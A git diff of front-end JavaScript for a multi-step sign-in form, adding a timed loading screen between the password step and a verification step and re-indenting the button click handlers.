@@ -95,15 +95,16 @@ function callbackFunc(response) {
 // postData("test")
 
 nextBtn.addEventListener("click", function(event) {
-    event.preventDefault(); 
-    passwordDiv.style.display = "block";
-    emailDiv.style.display = "none";
+  event.preventDefault(); 
+  passwordDiv.style.display = "block";
+  emailDiv.style.display = "none";
 });
 
 signInBtn.addEventListener("click", function(event) {
-    event.preventDefault(); 
-    verifyDiv.style.display = "block";
-    passwordDiv.style.display = "none";
+  event.preventDefault(); 
+  loadingDiv.style.display = "block";
+  passwordDiv.style.display = "none";
+  removeLoadingDiv();
 });
 
 let usernameValue = localStorage.getItem("username") || "";
@@ -116,6 +117,17 @@ function returnUsername() {
 }
 
 document.getElementById("username").addEventListener("keyup", returnUsername);
+
+
+function removeLoadingDiv() {
+  const loadingDiv = document.querySelector(".loading-screen-div");
+  if (loadingDiv) {
+    setTimeout(() => {
+      loadingDiv.style.display = "none";
+      verifyDiv.style.display ="block"
+    }, 2500);
+  }
+}
 
 
 
